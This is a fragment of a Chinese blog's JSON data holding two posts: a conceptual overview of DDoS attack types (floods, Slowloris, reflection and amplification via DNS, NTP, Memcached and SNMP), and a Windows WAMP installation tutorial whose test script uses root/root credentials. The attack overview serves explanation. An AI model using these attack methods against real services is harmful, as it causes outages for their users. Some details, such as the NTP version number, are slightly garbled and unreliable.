href=\"#UDP-Flood\" class=\"headerlink\" title=\"UDP-Flood\"></a>UDP-Flood</h4><p>利用UDP协议的无连接性，针对服务器开放的UDP端口发送大量伪造源IP地址的小包或大包进行攻击。</p>\n<h4 id=\"ICMP-Flood-Ping-Flood\"><a href=\"#ICMP-Flood-Ping-Flood\" class=\"headerlink\" title=\"ICMP-Flood(Ping-Flood)\"></a>ICMP-Flood(Ping-Flood)</h4><p>通过尽可能地快速发送ICMP数据包给受害者计算机，使受害者带宽不足或系统性能不够，影响正常用户的访问。</p>\n<h4 id=\"TCP-Flood\"><a href=\"#TCP-Flood\" class=\"headerlink\" title=\"TCP-Flood\"></a>TCP-Flood</h4><p>TCP攻击俗称SYN泛洪，利用TCP三次握手协议来攻击计算机，主要是通过伪造大量IP的半连接去攻击对方系统。</p>\n<h3 id=\"应用层拒绝服务\"><a href=\"#应用层拒绝服务\" class=\"headerlink\" title=\"应用层拒绝服务\"></a>应用层拒绝服务</h3><h4 id=\"CC攻击（HTTP-FLOOP）\"><a href=\"#CC攻击（HTTP-FLOOP）\" class=\"headerlink\" title=\"CC攻击（HTTP-FLOOP）\"></a>CC攻击（HTTP-FLOOP）</h4><p>攻击者操纵网络上的肉鸡进行海量的http request攻击，造成服务器资源耗尽，直到宕机崩溃。</p>\n<h4 id=\"slow-http-post\"><a href=\"#slow-http-post\" class=\"headerlink\" title=\"slow http post\"></a>slow http post</h4><p>也称为slow body，先将HTTP Header中的Content-Length设置为一个较大的值，并在HTTP BODY中以非常缓慢的速度一个字节一个字节的向Web服务器发送，导致服务器一直处于等待状态中。</p>\n<h4 id=\"Slowloris\"><a href=\"#Slowloris\" class=\"headerlink\" title=\"Slowloris\"></a>Slowloris</h4><p>也称为slow headers，攻击者始终构造不完整的http header(非正常的\\r\\n结尾)发送，同时还间隔一定时间再发送数据，导致服务器一直处于等待状态。</p>\n<h3 id=\"反射放大攻击\"><a href=\"#反射放大攻击\" class=\"headerlink\" title=\"反射放大攻击\"></a>反射放大攻击</h3><p>反射：正常的UDP协议中客户端发送请求到服务器端，服务器返回响应包到客户端。利用UDP协议的面向无连接，可以对发送请求包的源ip地址进行伪造，把源ip修改成受害者的ip地址，使服务器返回的响应包返回受害者的IP。这就是反射攻击。<br>放大：利用一个小的请求包来获取一个甚至多个大的响应包。</p>\n<h4 id=\"SNMP协议\"><a href=\"#SNMP协议\" class=\"headerlink\" title=\"SNMP协议\"></a>SNMP协议</h4><p>攻击者发送大量伪造IP(受害者IP)的GETBULK请求给开启了SNMP服务的设备，设备会将查询的结果返回给受害者IP。这里就是利用SNMP来进行了一个放大的功能。</p>\n<h4 id=\"DNS反射\"><a href=\"#DNS反射\" class=\"headerlink\" title=\"DNS反射\"></a>DNS反射</h4><p>正常流程：源IP地址–DNS查询–DNS服务器–DNS回复包–源IP地址<br>攻击流程：伪造IP地址(受害者IP)–DNS查询–DNS服务器–DNS回复包–伪造的IP地址(攻击目标)</p>\n<h4 id=\"NTP反射\"><a href=\"#NTP反射\" class=\"headerlink\" title=\"NTP反射\"></a>NTP反射</h4><p>NTP是Network Time Protocol。能够在网络连接延时不稳定时，将不同设备通过分组交换进行时钟同步。<br>反射原因：NTP（server 4.4.7p26之前版本）默认提供monlist功能（该功能用于监控NTP服务器），NTP服务器响应monlist后会返回与NTP服务器进行过时间同步的最后600个客户端IP。</p>\n<h4 id=\"Memcached\"><a href=\"#Memcached\" class=\"headerlink\" title=\"Memcached\"></a>Memcached</h4><p>Memcached是一款免费且开源的高性能分布式内存缓存系统，旨在通过减轻数据库负载来加速运行动态Web应用程序。<br>攻击流程：伪造IP地址(受害者IP)–发送请求到memcached服务器（11211端口）–回复放大万倍的包–伪造的IP地址(攻击目标)</p>\n<p>案例：Github于2018年2月28遭受Memcached DDOS攻击，达到1.35Tbps（兆兆位/秒）的流量访问</p>\n<h4 id=\"CLDAP\"><a href=\"#CLDAP\" class=\"headerlink\" title=\"CLDAP\"></a>CLDAP</h4><h4 id=\"SSDP\"><a href=\"#SSDP\" class=\"headerlink\" title=\"SSDP\"></a>SSDP</h4><h2 id=\"协议攻击\"><a href=\"#协议攻击\" class=\"headerlink\" title=\"协议攻击\"></a>协议攻击</h2><h3 id=\"SYN-FLOOD\"><a href=\"#SYN-FLOOD\" class=\"headerlink\" title=\"SYN-FLOOD\"></a>SYN-FLOOD</h3><p>正常流程：客户端发送SYN，服务端响应SYN+ACK，客户端回传ACK+1。<br>攻击流程：受控主机伪造源IP发送大量TCP SYN报文，使服务器打开大量的半开放连接，占满服务器的连接表，影响正常用户与服务器建立会话，造成拒绝服务。</p>\n<h4 id=\"ACK-Flood\"><a href=\"#ACK-Flood\" class=\"headerlink\" title=\"ACK-Flood\"></a>ACK-Flood</h4><p>攻击原理：伪造SYN+ACK包发送给目标主机，目标主机查看TCP连接表有无ACK连接，有则发送ACK包完成TCP连接，无则发送ACK+RSY断开。在查询的过程中会消耗CPU资源，攻击者通过大量发送SYN+ACK包来打摊服务器。</p>\n<h4 id=\"Sockstress攻击\"><a href=\"#Sockstress攻击\" class=\"headerlink\" title=\"Sockstress攻击\"></a>Sockstress攻击</h4><p>建立三次握手中，第三次发送ACK时，将TCP滑动窗口大小修改为0，服务器发现后会停止数据传输并询问TCP窗口是否更新，导致服务器一直维持等待数据发送和探测窗口更新。</p>\n<h4 id=\"SSL-Flood\"><a href=\"#SSL-Flood\" class=\"headerlink\" title=\"SSL-Flood\"></a>SSL-Flood</h4><p>通过SSL连接并握手后，不断重新协商来建立新的秘钥，而服务端消耗的资源是客户端的15倍，使服务器忙于协商秘钥而停止响应。</p>\n"},{"title":"Windows下PHP环境安装","date":"2018-09-19T01:09:12.000Z","_content":"\n#  windows下PHP环境的搭建 #\n\n---\n\n## 概述 ##\n\nwindows下的PHP环境简称WAMP（windows+Apache+MySQL+PHP）\n\nPHP的环境搭建需要安装Apache+MySQL+PHP,还需要进行相关配置。与集成开发环境相比,WAMP的过程相对繁琐,那么可以使用phpstudy这样的开发环境。\n\n下面MySQL数据库使用用MariaDB,它是MySQL源代码的一个分支,与MySQL使用基本相同,在MySQL被甲骨文收购后随时存在闭源的风险的情况下,他是一个很好的替代品。\n\n下载地址:\n\n* [Apache](https://httpd.apache.org/download.cgi#apache24)\n* [PHP](http://www.php.net/) \n* [MariaDB](https://downloads.mariadb.org/)\n\n安装顺序按照Apache--->PHP--->MySQL进行。\n\n## 安装包准备 ##\n\n### Apache ###\n\n点击上面的下载地址进入Apache官网\n\n![1](https://i.imgur.com/7zAnKFy.png)\n\n![2](https://i.imgur.com/edi2Whn.png)\n\n![3](https://i.imgur.com/uKZSvyc.png)\n\n根据你的windows操作系统位数选择安装包\n\n### PHP ###\n\n点击上面的下载地址进入PHP官网\n\n![4](https://i.imgur.com/EUeJCvu.png)\n\n选择最新版链接下载进入PHP官网\n\n![5](https://i.imgur.com/Jo2tRgC.png)\n\n![6](https://i.imgur.com/7m2gZiA.png)\n\n根据你的windows操作系统位数选择安装包\n\n### MariaDB ###\n\n点击上面的下载地址进入MariaDB官网\n\n![7](https://i.imgur.com/q3BIl6H.png)\n\n![8](https://i.imgur.com/FTeAPYX.png)\n\n根据你的windows操作系统位数选择安装包\n\n### 结果 ###\n\n![9](https://i.imgur.com/1OWP6zr.png)\n\n## Apache 安装 ##\n\n> 将http开头的安装包解压,多出一个`Apache24`的文件夹\n\n![10](https://i.imgur.com/Vcy2Nmm.png)\n\n> 将`Apache24`放在你想要放的任何位置,为了方便管理,我在C盘新建一个目录`WAMP`,把`Apache24`放进去。之后也把所有的安装放在这里\n\n![11](https://i.imgur.com/RvNhCf4.png)\n\n进入到`Apache24\\bin`\n\n![12](https://i.imgur.com/cU7NZIa.png)\n\n<font color=red>\n​\t将上图地址栏标记的的地址复制\n​\t\n\t`C:\\WAMP\\Apache24\\bin`\n</font>\n\n![13](https://i.imgur.com/PzSG47T.png)\n\n鼠标移到`cmd`上,右键以管理员身份运行\n\n![14](https://i.imgur.com/q3TSCMY.png)\n\n输入`cd `(注意这有个空格) 并把刚才复制的`C:\\WAMP\\Apache24\\bin`粘贴上去,回车运行\n\n![15](https://i.imgur.com/UyPn696.png)\n\n可以看到路径改变了,再输入`httpd.exe -k install`,执行安装过程。\n\n![16](https://i.imgur.com/ULVsMlk.png)\n\n如果出现了上图的错误,是因为Win7系统是缺少了VC++2015组件,Win10系统就不会出现这个问题。\n\ncmd窗口先别关闭。点下面的连接下载组件\n\n[VC++2015组件](https://www.microsoft.com/zh-CN/download/details.aspx?id=48145)\n\n![17](https://i.imgur.com/2A5ZNpn.png)\n\n我是Win7 32位系统就选择32位的(64位就选64位的),然后点next。\n\n把下载好的安装程序双击运行。同意安装直到安装成功。\n\n![18](https://i.imgur.com/0YLPYL3.png)\n\n重新输入`httpd.exe -k install`,你也可以按方向键的↑,它记录了历史输入,找到`httpd.exe -k install`后回车执行。\n\n![19](https://i.imgur.com/Ndq3QvL.png)\n\n提示Apache2.4安装成功。\n\n安装成功后按Windows+R键,输入`services.msc`快捷打开系统服务。\n\n![20](https://i.imgur.com/JUpD4GF.png)\n\n找到`Apache2.4`\n\n![21](https://i.imgur.com/k1y7ybF.png)\n\n点击后右键属性修改启动类型为手动。\n\n![22](https://i.imgur.com/P5cwtUi.png)\n\n点击启动后,Apache2.4会运行。\n\n如果你出现和我下图一样的错误,可以查看解决办法,没有出现该问题可不看这步\n\n![23](https://i.imgur.com/QADrjLI.png)\n\n在我的安装目录`C:\\WAMP\\Apache24\\bin`下有个`httpd.exe`,用cmd让他执行,它会提示错误信息。\n\n![24](https://i.imgur.com/z8AJr2m.png)\n\n![25](https://i.imgur.com/eigfN7c.png)\n\n<font color=red>\n错误原因:httpd.conf里面配置的ServerRoot路径跟实际路径不一致，导致路径无效。\n</font>\n\n在你的安装路径的`Apache24\\`底下有个`conf`文件夹,进入到该目录。有个`httpd.conf`文件。`httpd.conf`文件包含了Apache的配置。用编辑器打开`httpd.conf`,我用的是EditPlus,什么编辑器都没有的话就用自带的记事本打开。\n\n![26](https://i.imgur.com/QfySGgM.png)\n\n找到提示错误的39行\n\n![27](https://i.imgur.com/S5nUOVU.png)\n\n其实是38行需要修改,修改成如下图配置,它其实记录了`Apache24\\`的路径,它默认配置是在C盘根目录的`Apache24\\`,一旦你把`Apache24\\`放在别的地方都需要改动这个配置。这里我添加上`C:\\WAMP`,显示如下。也就是说如果你的路径在`D:\\Apache24`下面就填`D:\\Apache24`。\n\n![28](https://i.imgur.com/nw4tNUj.png)\n\n修改记得保存,启动Apache2.4成功\n\n![29](https://i.imgur.com/EXJwtuV.png)\n\n随便打开个浏览器输入\n\n`http://localhost/`\n\n如果返回如下界面就表示配置成功,Apache这一关就算过了。\n\n![30](https://i.imgur.com/MxKHSo4.png)\n\n## PHP 安装及配置 ##\n\n### 解压 ###\n\n将php的压缩解压,当前目录下多出了php开头的文件夹,重命名为php后拷贝到`C:\\WAMP`\n\n![31](https://i.imgur.com/X1jc6ey.png)\n\n![32](https://i.imgur.com/rNmAYLv.png)\n\n### 选择配置文件 ###\n双击进入php文件夹,有两个配置文件`php.ini-development`和`php.ini-production`。\n\n![33](https://i.imgur.com/1RTQN4W.png)\n\n要使用哪个就把文件名修改成`php.ini`就行。`php.ini-production`在参数配置上更具有安全性,适合产品上线使用,学习环境下使用`php.ini-development`就行了。这里将`php.ini-development`改成`php.ini`。\n\n用文本编辑器打开改名的`php.ini`。\n\n### 开启扩展模块 ###\n\n搜索`extension_dir`,大概在730行左右。\n\n![34](https://i.imgur.com/9bi5KDp.png)\n\n配置文件中`;`的作用是注释,要开启某个配置需要把开头的`;`去掉。\n这里配置的是php的扩展目录,该目录文件为PHP提供一些扩展的功能。可以查看下该目录。\n\n![36](https://i.imgur.com/AI7j3y3.png)\n\n将该路径复制到“”中,并把开头启注释作用的`;`去掉。这里的路径填写你自己的路径。\n\n![35](https://i.imgur.com/46N7GV9.png)\n\n修改之后PHP就能找到扩展文件所在的目录了,但是这些找到的扩展文件没有启用,需要手动配置。现在启用mysql数据库扩展,在`php.ini`中搜索`mysqli`\n\n![37](https://i.imgur.com/H4zCLcW.png)\n\n大概在897行\n\n`;extension=mysqli`\n\n去掉`;`开启mysql数据库扩展\n\n![38](https://i.imgur.com/rv8U8iZ.png)\n\n保存并退出。\n\n## Apache 连接 PHP ##\n\n### 概述 ###\n\n将Apache安装好和PHP安装配置好后并不表示Apache和PHP关联起来了,还要配置Apache的配置文件`httpd.conf`让Apache认识PHP。\n\n### Apache加载PHP模块 ###\n\n我的Apache配置文件在`C:\\WAMP\\Apache24\\conf`下,用编辑器打开。\n\n![39](https://i.imgur.com/5OHHMYx.png)\n\n找到183行左右,这是加载模块的最后一行\n\n![40](https://i.imgur.com/Ruuy221.png)\n\n添加下面两句话\n<p>LoadModule php7\\_module \"<font color=red>C:\\WAMP\\php</font>\\php7apache2_4.dll\"<p>\n\n<p>PHPIniDir \"<font color=red>C:\\WAMP</font>\\php\"<p>\n\n红色部分修改为你的路径\n\n![41](https://i.imgur.com/oACAJzi.png)\n\n第一句话加载了PHP模块\n\n第二句添加了`php.ini`所在的目录\n\n### Apache解析PHP###\n\n找435行左右\n\n![42](https://i.imgur.com/Gof1i6b.png)\n\n添加\n\n`AddHandler application/x-httpd-php .php`\n\n![43](https://i.imgur.com/myPKwea.png)\n\n保存并退出\n\n重新启动Apache\n\n![44](https://i.imgur.com/iD6KxBm.png)\n\n### 测试是否正常解析PHP文件 ###\n\n进入`Apache24\\`下的`htdocs`目录,新建一个`phpinfo.php`的php文件\n\n![45](https://i.imgur.com/70SPdg3.png)\n\n编辑`phpinfo.php`内容\n\n![46](https://i.imgur.com/XIGNqcV.png)\n\n`<?php\n​\tphpinfo();\n?>`\n\n删除该目录下的`index.html`文件,因为它会妨碍目录显示。访问`localhost`\n\n![47](https://i.imgur.com/7rNLnrk.png)\n\n打开`phpinfo.php`文件,显示如下则解析成功。\n\n![48](https://i.imgur.com/IWz1Lw2.png)\n\n## MYSQL 安装及测试 ##\n\n### MYSQL安装 ###\n\n![49](https://i.imgur.com/dkEp5De.png)\n\n双击安装\n\n![50](https://i.imgur.com/VVm8POP.png)\n\n建立数据库用户,这里我建立账户名用户名都为root\n\n![51](https://i.imgur.com/mphJYjl.png)\n\n![52](https://i.imgur.com/YBbIiAH.png)\n\n默认就行\n\n### 测试数据库是否安装成功 ###\n\n新建`mysql.php`\n\n![53](https://i.imgur.com/9trRZo4.png)\n\n下面的username填你刚才创建的用户名,password填你刚创建的密码。\n\n数据库测试代码:\n\n\t<?php\n\t\t$servername = \"localhost\";\n\t\t$username = \"root\";\n\t\t$password = \"root\";\n\t \n\t\t// 创建连接\n\t\t$conn = new mysqli($servername, $username, $password);\n\t \n\t\t// 检测连接\n\t\tif ($conn->connect_error) {\n\t    \tdie(\"fail: \" . $conn->connect_error);\n\t\t} \n\t\techo \"success\";\n\t?>\n\n![54](https://i.imgur.com/9y23zfv.png)\n\n双击运行\n\n![55](https://i.imgur.com/dQtf4AN.png)\n\n返回success表示数据库安装成功\n\n![56](https://i.imgur.com/H0doqgq.png)\n\n","source":"_posts/PHP环境安装.md","raw":"---\ntitle: Windows下PHP环境安装\ndate: 2018-09-19 09:09:12\ntags: [环境搭建]\ncategories: php\n---\n\n#  windows下PHP环境的搭建 #\n\n---\n\n## 概述 ##\n\nwindows下的PHP环境简称WAMP（windows+Apache+MySQL+PHP）\n\nPHP的环境搭建需要安装Apache+MySQL+PHP,还需要进行相关配置。与集成开发环境相比,WAMP的过程相对繁琐,那么可以使用phpstudy这样的开发环境。\n\n下面MySQL数据库使用用MariaDB,它是MySQL源代码的一个分支,与MySQL使用基本相同,在MySQL被甲骨文收购后随时存在闭源的风险的情况下,他是一个很好的替代品。\n\n下载地址:\n\n* [Apache](https://httpd.apache.org/download.cgi#apache24)\n* [PHP](http://www.php.net/) \n* [MariaDB](https://downloads.mariadb.org/)\n\n安装顺序按照Apache--->PHP--->MySQL进行。\n\n## 安装包准备 ##\n\n### Apache ###\n\n点击上面的下载地址进入Apache官网\n\n![1](https://i.imgur.com/7zAnKFy.png)\n\n![2](https://i.imgur.com/edi2Whn.png)\n\n![3](https://i.imgur.com/uKZSvyc.png)\n\n根据你的windows操作系统位数选择安装包\n\n### PHP ###\n\n点击上面的下载地址进入PHP官网\n\n![4](https://i.imgur.com/EUeJCvu.png)\n\n选择最新版链接下载进入PHP官网\n\n![5](https://i.imgur.com/Jo2tRgC.png)\n\n![6](https://i.imgur.com/7m2gZiA.png)\n\n根据你的windows操作系统位数选择安装包\n\n### MariaDB ###\n\n点击上面的下载地址进入MariaDB官网\n\n![7](https://i.imgur.com/q3BIl6H.png)\n\n![8](https://i.imgur.com/FTeAPYX.png)\n\n根据你的windows操作系统位数选择安装包\n\n### 结果 ###\n\n![9](https://i.imgur.com/1OWP6zr.png)\n\n## Apache 安装 ##\n\n> 将http开头的安装包解压,多出一个`Apache24`的文件夹\n\n![10](https://i.imgur.com/Vcy2Nmm.png)\n\n> 将`Apache24`放在你想要放的任何位置,为了方便管理,我在C盘新建一个目录`WAMP`,把`Apache24`放进去。之后也把所有的安装放在这里\n\n![11](https://i.imgur.com/RvNhCf4.png)\n\n进入到`Apache24\\bin`\n\n![12](https://i.imgur.com/cU7NZIa.png)\n\n<font color=red>\n​\t将上图地址栏标记的的地址复制\n​\t\n\t`C:\\WAMP\\Apache24\\bin`\n</font>\n\n![13](https://i.imgur.com/PzSG47T.png)\n\n鼠标移到`cmd`上,右键以管理员身份运行\n\n![14](https://i.imgur.com/q3TSCMY.png)\n\n输入`cd `(注意这有个空格) 并把刚才复制的`C:\\WAMP\\Apache24\\bin`粘贴上去,回车运行\n\n![15](https://i.imgur.com/UyPn696.png)\n\n可以看到路径改变了,再输入`httpd.exe -k install`,执行安装过程。\n\n![16](https://i.imgur.com/ULVsMlk.png)\n\n如果出现了上图的错误,是因为Win7系统是缺少了VC++2015组件,Win10系统就不会出现这个问题。\n\ncmd窗口先别关闭。点下面的连接下载组件\n\n[VC++2015组件](https://www.microsoft.com/zh-CN/download/details.aspx?id=48145)\n\n![17](https://i.imgur.com/2A5ZNpn.png)\n\n我是Win7 32位系统就选择32位的(64位就选64位的),然后点next。\n\n把下载好的安装程序双击运行。同意安装直到安装成功。\n\n![18](https://i.imgur.com/0YLPYL3.png)\n\n重新输入`httpd.exe -k install`,你也可以按方向键的↑,它记录了历史输入,找到`httpd.exe -k install`后回车执行。\n\n![19](https://i.imgur.com/Ndq3QvL.png)\n\n提示Apache2.4安装成功。\n\n安装成功后按Windows+R键,输入`services.msc`快捷打开系统服务。\n\n![20](https://i.imgur.com/JUpD4GF.png)\n\n找到`Apache2.4`\n\n![21](https://i.imgur.com/k1y7ybF.png)\n\n点击后右键属性修改启动类型为手动。\n\n![22](https://i.imgur.com/P5cwtUi.png)\n\n点击启动后,Apache2.4会运行。\n\n如果你出现和我下图一样的错误,可以查看解决办法,没有出现该问题可不看这步\n\n![23](https://i.imgur.com/QADrjLI.png)\n\n在我的安装目录`C:\\WAMP\\Apache24\\bin`下有个`httpd.exe`,用cmd让他执行,它会提示错误信息。\n\n![24](https://i.imgur.com/z8AJr2m.png)\n\n![25](https://i.imgur.com/eigfN7c.png)\n\n<font color=red>\n错误原因:httpd.conf里面配置的ServerRoot路径跟实际路径不一致，导致路径无效。\n</font>\n\n在你的安装路径的`Apache24\\`底下有个`conf`文件夹,进入到该目录。有个`httpd.conf`文件。`httpd.conf`文件包含了Apache的配置。用编辑器打开`httpd.conf`,我用的是EditPlus,什么编辑器都没有的话就用自带的记事本打开。\n\n![26](https://i.imgur.com/QfySGgM.png)\n\n找到提示错误的39行\n\n![27](https://i.imgur.com/S5nUOVU.png)\n\n其实是38行需要修改,修改成如下图配置,它其实记录了`Apache24\\`的路径,它默认配置是在C盘根目录的`Apache24\\`,一旦你把`Apache24\\`放在别的地方都需要改动这个配置。这里我添加上`C:\\WAMP`,显示如下。也就是说如果你的路径在`D:\\Apache24`下面就填`D:\\Apache24`。\n\n![28](https://i.imgur.com/nw4tNUj.png)\n\n修改记得保存,启动Apache2.4成功\n\n![29](https://i.imgur.com/EXJwtuV.png)\n\n随便打开个浏览器输入\n\n`http://localhost/`\n\n如果返回如下界面就表示配置成功,Apache这一关就算过了。\n\n![30](https://i.imgur.com/MxKHSo4.png)\n\n## PHP 安装及配置 ##\n\n### 解压 ###\n\n将php的压缩解压,当前目录下多出了php开头的文件夹,重命名为php后拷贝到`C:\\WAMP`\n\n![31](https://i.imgur.com/X1jc6ey.png)\n\n![32](https://i.imgur.com/rNmAYLv.png)\n\n### 选择配置文件 ###\n双击进入php文件夹,有两个配置文件`php.ini-development`和`php.ini-production`。\n\n![33](https://i.imgur.com/1RTQN4W.png)\n\n要使用哪个就把文件名修改成`php.ini`就行。`php.ini-production`在参数配置上更具有安全性,适合产品上线使用,学习环境下使用`php.ini-development`就行了。这里将`php.ini-development`改成`php.ini`。\n\n用文本编辑器打开改名的`php.ini`。\n\n### 开启扩展模块 ###\n\n搜索`extension_dir`,大概在730行左右。\n\n![34](https://i.imgur.com/9bi5KDp.png)\n\n配置文件中`;`的作用是注释,要开启某个配置需要把开头的`;`去掉。\n这里配置的是php的扩展目录,该目录文件为PHP提供一些扩展的功能。可以查看下该目录。\n\n![36](https://i.imgur.com/AI7j3y3.png)\n\n将该路径复制到“”中,并把开头启注释作用的`;`去掉。这里的路径填写你自己的路径。\n\n![35](https://i.imgur.com/46N7GV9.png)\n\n修改之后PHP就能找到扩展文件所在的目录了,但是这些找到的扩展文件没有启用,需要手动配置。现在启用mysql数据库扩展,在`php.ini`中搜索`mysqli`\n\n![37](https://i.imgur.com/H4zCLcW.png)\n\n大概在897行\n\n`;extension=mysqli`\n\n去掉`;`开启mysql数据库扩展\n\n![38](https://i.imgur.com/rv8U8iZ.png)\n\n保存并退出。\n\n## Apache 连接 PHP ##\n\n### 概述 ###\n\n将Apache安装好和PHP安装配置好后并不表示Apache和PHP关联起来了,还要配置Apache的配置文件`httpd.conf`让Apache认识PHP。\n\n### Apache加载PHP模块 ###\n\n我的Apache配置文件在`C:\\WAMP\\Apache24\\conf`下,用编辑器打开。\n\n![39](https://i.imgur.com/5OHHMYx.png)\n\n找到183行左右,这是加载模块的最后一行\n\n![40](https://i.imgur.com/Ruuy221.png)\n\n添加下面两句话\n<p>LoadModule php7\\_module \"<font color=red>C:\\WAMP\\php</font>\\php7apache2_4.dll\"<p>\n\n<p>PHPIniDir \"<font color=red>C:\\WAMP</font>\\php\"<p>\n\n红色部分修改为你的路径\n\n![41](https://i.imgur.com/oACAJzi.png)\n\n第一句话加载了PHP模块\n\n第二句添加了`php.ini`所在的目录\n\n### Apache解析PHP###\n\n找435行左右\n\n![42](https://i.imgur.com/Gof1i6b.png)\n\n添加\n\n`AddHandler application/x-httpd-php .php`\n\n![43](https://i.imgur.com/myPKwea.png)\n\n保存并退出\n\n重新启动Apache\n\n![44](https://i.imgur.com/iD6KxBm.png)\n\n### 测试是否正常解析PHP文件 ###\n\n进入`Apache24\\`下的`htdocs`目录,新建一个`phpinfo.php`的php文件\n\n![45](https://i.imgur.com/70SPdg3.png)\n\n编辑`phpinfo.php`内容\n\n![46](https://i.imgur.com/XIGNqcV.png)\n\n`<?php\n​\tphpinfo();\n?>`\n\n删除该目录下的`index.html`文件,因为它会妨碍目录显示。访问`localhost`\n\n![47](https://i.imgur.com/7rNLnrk.png)\n\n打开`phpinfo.php`文件,显示如下则解析成功。\n\n![48](https://i.imgur.com/IWz1Lw2.png)\n\n## MYSQL 安装及测试 ##\n\n### MYSQL安装 ###\n\n![49](https://i.imgur.com/dkEp5De.png)\n\n双击安装\n\n![50](https://i.imgur.com/VVm8POP.png)\n\n建立数据库用户,这里我建立账户名用户名都为root\n\n![51](https://i.imgur.com/mphJYjl.png)\n\n![52](https://i.imgur.com/YBbIiAH.png)\n\n默认就行\n\n### 测试数据库是否安装成功 ###\n\n新建`mysql.php`\n\n![53](https://i.imgur.com/9trRZo4.png)\n\n下面的username填你刚才创建的用户名,password填你刚创建的密码。\n\n数据库测试代码:\n\n\t<?php\n\t\t$servername = \"localhost\";\n\t\t$username = \"root\";\n\t\t$password = \"root\";\n\t \n\t\t// 创建连接\n\t\t$conn = new mysqli($servername, $username, $password);\n\t \n\t\t// 检测连接\n\t\tif ($conn->connect_error) {\n\t    \tdie(\"fail: \" . $conn->connect_error);\n\t\t} \n\t\techo \"success\";\n\t?>\n\n![54](https://i.imgur.com/9y23zfv.png)\n\n双击运行\n\n![55](https://i.imgur.com/dQtf4AN.png)\n\n返回success表示数据库安装成功\n\n![56](https://i.imgur.com/H0doqgq.png)\n\n","slug":"PHP环境安装","published":1,"updated":"2019-06-19T17:23:13.381Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjx3istkq009k4dsbb48jprxw","content":"<h1 id=\"windows下PHP环境的搭建\"><a href=\"#windows下PHP环境的搭建\" class=\"headerlink\" title=\"windows下PHP环境的搭建\"></a>windows下PHP环境的搭建</h1><hr>\n<h2 id=\"概述\"><a href=\"#概述\" class=\"headerlink\" title=\"概述\"></a>概述</h2><p>windows下的PHP环境简称WAMP（windows+Apache+MySQL+PHP）</p>\n<p>PHP的环境搭建需要安装Apache+MySQL+PHP,还需要进行相关配置。与集成开发环境相比,WAMP的过程相对繁琐,那么可以使用phpstudy这样的开发环境。</p>\n<p>下面MySQL数据库使用用MariaDB,它是MySQL源代码的一个分支,与MySQL使用基本相同,在MySQL被甲骨文收购后随时存在闭源的风险的情况下,他是一个很好的替代品。</p>\n<p>下载地址:</p>\n<ul>\n<li><a href=\"https://httpd.apache.org/download.cgi#apache24\" target=\"_blank\" rel=\"noopener\">Apache</a></li>\n<li><a href=\"http://www.php.net/\" target=\"_blank\" rel=\"noopener\">PHP</a> </li>\n<li><a href=\"https://downloads.mariadb.org/\" target=\"_blank\" rel=\"noopener\">MariaDB</a></li>\n</ul>\n<p>安装顺序按照Apache—&gt;PHP—&gt;MySQL进行。</p>\n<h2 id=\"安装包准备\"><a href=\"#安装包准备\" class=\"headerlink\" title=\"安装包准备\"></a>安装包准备</h2><h3 id=\"Apache\"><a href=\"#Apache\" class=\"headerlink\" title=\"Apache\"></a>Apache</h3><p>点击上面的下载地址进入Apache官网</p>\n<p><img src=\"https://i.imgur.com/7zAnKFy.png\" alt=\"1\"></p>\n<p><img src=\"https://i.imgur.com/edi2Whn.png\" alt=\"2\"></p>\n<p><img src=\"https://i.imgur.com/uKZSvyc.png\" alt=\"3\"></p>\n<p>根据你的windows操作系统位数选择安装包</p>\n<h3 id=\"PHP\"><a href=\"#PHP\" class=\"headerlink\" title=\"PHP\"></a>PHP</h3><p>点击上面的下载地址进入PHP官网</p>\n<p><img src=\"https://i.imgur.com/EUeJCvu.png\" alt=\"4\"></p>\n<p>选择最新版链接下载进入PHP官网</p>\n<p><img src=\"https://i.imgur.com/Jo2tRgC.png\" alt=\"5\"></p>\n<p><img src=\"https://i.imgur.com/7m2gZiA.png\" alt=\"6\"></p>\n<p>根据你的windows操作系统位数选择安装包</p>\n<h3 id=\"MariaDB\"><a href=\"#MariaDB\" class=\"headerlink\" title=\"MariaDB\"></a>MariaDB</h3><p>点击上面的下载地址进入MariaDB官网</p>\n<p><img src=\"https://i.imgur.com/q3BIl6H.png\" alt=\"7\"></p>\n<p><img src=\"https://i.imgur.com/FTeAPYX.png\" alt=\"8\"></p>\n<p>根据你的windows操作系统位数选择安装包</p>\n<h3 id=\"结果\"><a href=\"#结果\" class=\"headerlink\" title=\"结果\"></a>结果</h3><p><img src=\"https://i.imgur.com/1OWP6zr.png\" alt=\"9\"></p>\n<h2 id=\"Apache-安装\"><a href=\"#Apache-安装\" class=\"headerlink\" title=\"Apache 安装\"></a>Apache 安装</h2><blockquote>\n<p>将http开头的安装包解压,多出一个<code>Apache24</code>的文件夹</p>\n</blockquote>\n<p><img src=\"https://i.imgur.com/Vcy2Nmm.png\" alt=\"10\"></p>\n<blockquote>\n<p>将<code>Apache24</code>放在你想要放的任何位置,为了方便管理,我在C盘新建一个目录<code>WAMP</code>,把<code>Apache24</code>放进去。之后也把所有的安装放在这里</p>\n</blockquote>\n<p><img src=\"https://i.imgur.com/RvNhCf4.png\" alt=\"11\"></p>\n<p>进入到<code>Apache24\\bin</code></p>\n<p><img src=\"https://i.imgur.com/cU7NZIa.png\" alt=\"12\"></p>\n<font color=\"red\">\n​    将上图地址栏标记的的地址复制\n​    \n    `C:\\WAMP\\Apache24\\bin`\n</font>\n\n<p><img src=\"https://i.imgur.com/PzSG47T.png\" alt=\"13\"></p>\n<p>鼠标移到<code>cmd</code>上,右键以管理员身份运行</p>\n<p><img src=\"https://i.imgur.com/q3TSCMY.png\" alt=\"14\"></p>\n<p>输入<code>cd</code>(注意这有个空格) 并把刚才复制的<code>C:\\WAMP\\Apache24\\bin</code>粘贴上去,回车运行</p>\n<p><img src=\"https://i.imgur.com/UyPn696.png\" alt=\"15\"></p>\n<p>可以看到路径改变了,再输入<code>httpd.exe -k install</code>,执行安装过程。</p>\n<p><img src=\"https://i.imgur.com/ULVsMlk.png\" alt=\"16\"></p>\n<p>如果出现了上图的错误,是因为Win7系统是缺少了VC++2015组件,Win10系统就不会出现这个问题。</p>\n<p>cmd窗口先别关闭。点下面的连接下载组件</p>\n<p><a href=\"https://www.microsoft.com/zh-CN/download/details.aspx?id=48145\" target=\"_blank\" rel=\"noopener\">VC++2015组件</a></p>\n<p><img src=\"https://i.imgur.com/2A5ZNpn.png\" alt=\"17\"></p>\n<p>我是Win7 32位系统就选择32位的(64位就选64位的),然后点next。</p>\n<p>把下载好的安装程序双击运行。同意安装直到安装成功。</p>\n<p><img 